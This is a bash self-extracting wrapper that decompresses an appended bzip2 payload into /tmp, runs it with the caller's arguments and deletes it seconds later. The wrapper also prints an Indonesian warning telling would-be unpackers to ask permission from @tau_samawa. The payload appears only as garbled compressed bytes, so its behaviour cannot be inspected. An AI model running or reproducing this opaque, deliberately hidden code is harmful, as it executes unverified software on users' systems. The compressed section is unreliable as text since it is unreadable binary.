#!/bin/bash
skip=23
set -C
umask=`umask`
umask 77
tmpfile=`tempfile -p gztmp -d /tmp` || exit 1
if /usr/bin/tail -n +$skip "$0" | /bin/bzip2 -cd >> $tmpfile; then
  umask $umask
  /bin/chmod 700 $tmpfile
  prog="`echo $0 | /bin/sed 's|^.*/||'`"
  if /bin/ln -T $tmpfile "/tmp/$prog" 2>/dev/null; then
    trap '/bin/rm -f $tmpfile "/tmp/$prog"; exit $res' 0
    (/bin/sleep 5; /bin/rm -f $tmpfile "/tmp/$prog") 2>/dev/null &
    /tmp/"$prog" ${1+"$@"}; res=$?
  else
    trap '/bin/rm -f $tmpfile; exit $res' 0
    (/bin/sleep 5; /bin/rm -f $tmpfile) 2>/dev/null &
    $tmpfile ${1+"$@"}; res=$?
  fi
else
  echo MAU DIBONGKAR YA BANG ? IZIN DULU KE @tau_samawa $0; exit 1
fi; exit $res
BZh91AY&SYI7�� ���� ����������pD@  `>w�C]����r���j �@�E=OP�&jz�F��@dh�&� �44Q� �I��b�I=4�hѠ i�   4   i4�T�!�~�����         � �����@� 4C@ � %14�MM�4�����M�bi�4Dځ���FjddH@	�D�M4�I�=M�i#&�4zM�4�1 �~g"��!�+��o���U'��Q�V�`����ѥ/��ΰ�$g��O�핊�P �&�q�iL�I%FI��!"!�G @	 
�)� J��
�/�
�"7YU�FZ�H��Sn������4l�N�x�F���X����`_갪��0}Q1������࿄"��k�a=��cq	�|
A���:��a���!;i!��8!��	D�tM�U�l[�5|4:�o惮�̏O�A�I�fL7�?��>ElM$�U���f8�g "㾆�e�:����>���Ɩ􄲐J�9@0i��;����1B��R� �i������"�X<H�5���K6��ݹ9��H(c!�	+���==��^Kw'�?�.�aEt�e���_E�G���x�Q��N�f���T�p��ֈN0�P�-1�9�=�p��p �8�nA�ͅ0d��y=+E�(O 	B��Z�=@�� ڊ,P�����N�bE��.��0���8�n�aR:�>sx�L�P�~ڒ ��EZ#�S%�"�	���,0����0.��ZaDZ�a*��Y2	�	
�9	Ҿ�{�b�ДI�[����y���!��M�L X��zwl�D�����(�
�q�>������$�4"�*�!I`�-���U�}U��(4C��8��1
 f(Q7Q@0����"P!Pw�U��6����@� $�;�z% ��l	㴈-��%�$�q�g���ԩ�jݵ��C���:#�&�A��d5�2��xw�U^|@$��p���O	�Ç���+���(�������k\�iD$ �j�p�� �-�8q.R��h�q	���~�mo���UUJR��o��$DDG�K�C�kH���d����	�4�m��l�cl6=&3�D�eY� �FU@�.ҍ���贩!j3��՜V[.�qP��,���w��H").��@��{b�����TjZ���$s�����uS���]ҳ�Ο_�������b�3 �D���<?����vj�Hy�bA�a� yO�Ә$_<:=�O@�8t�eH����1`x��.k��3��D0W)�V3°b�L���}�Q�1���D"��*�8���Y�Yez�ᄇ�	�o�&0�����r���)< Z�ݒ,�������$����S�-g_��	�(�G,%!o�J��y�#�kh�jډ�#���t4ɒD��1+�y2���y�4��������mOp	�I ��2XQT����Y�P�Vҟ��;��j`ȸ���MT�F������(e��N3�[������[�!���^v��4��=�	�+(�,�9��`{�h��(OMkt��ù��l��Fi���NZ%�'V���ۀ�=F�a`XZ�\���[J����ۢ�f*\-�Cq�!|��dp
!X��	 ��#�cyO��^� �@��H��h�P�"���X�n3�"�?�
p9�{�]&(3��&�D� �&.��H� �J
Ò�	��rc���	8�+,$���I9�� ��=�ҥ���M�B �<�`�F(u�pÅ��hB���,��A,����˝0��S���,MO�X���~��7�U�Z�D�	bj&t�_K���gY�8Sx82C�&[�D����'��� �_^ע#�\�s�n�F�l*/�i�w�������`FD�1������ �&D�)��LN]3����ƈ����wx]��j�G�Gr�xn @h�i��SH&EcWS�ڕ�mص�E�$�@g��-�� $h|o���v��L�pB���LEu$� (B�+U��;,��-$�� ��@2*����Y��Q�ؐ� !@�����a�-[dK�@ N�z��B:�[}H+#ꔜ�T��w9b�u������������%�H'B:p	%k��J��\�ï~�{�u� L��CQ�8�1� �<�_:�҆�W�N����d�B�W��{1�,*&��Z ޼FF'Yy��@1�me���6�J��%��Y��u"qy�WIL�+6��[˲�V��p��jz�HuVd�^ܶF�	�3�DP��"Rd[t�5�U�S��"`wh(�Uΐd%ΰ+��)�KA��R��z�3�-��m:�ou�;ʄ4%�
�++����k,0A�$���y8@7�� 
�"9{���z�#�-�+/�Jm _��s�6 񐣟�F�62��v��]�&�	���(����;�JD���HTJ�%(���lU�P�)���H�
	&�_ 